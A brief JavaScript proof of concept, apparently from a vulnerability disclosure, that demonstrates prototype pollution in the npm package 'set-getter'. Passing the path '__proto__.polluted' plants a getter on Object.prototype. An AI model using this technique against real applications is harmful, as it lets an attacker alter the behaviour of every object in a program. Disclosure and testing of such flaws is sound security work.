var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
var setGetter = require('set-getter');
var obj = {};
console.log({}.polluted);
setGetter(obj, '__proto__.polluted', function (polluted) {
    return 'yes';
});
console.log({}.polluted);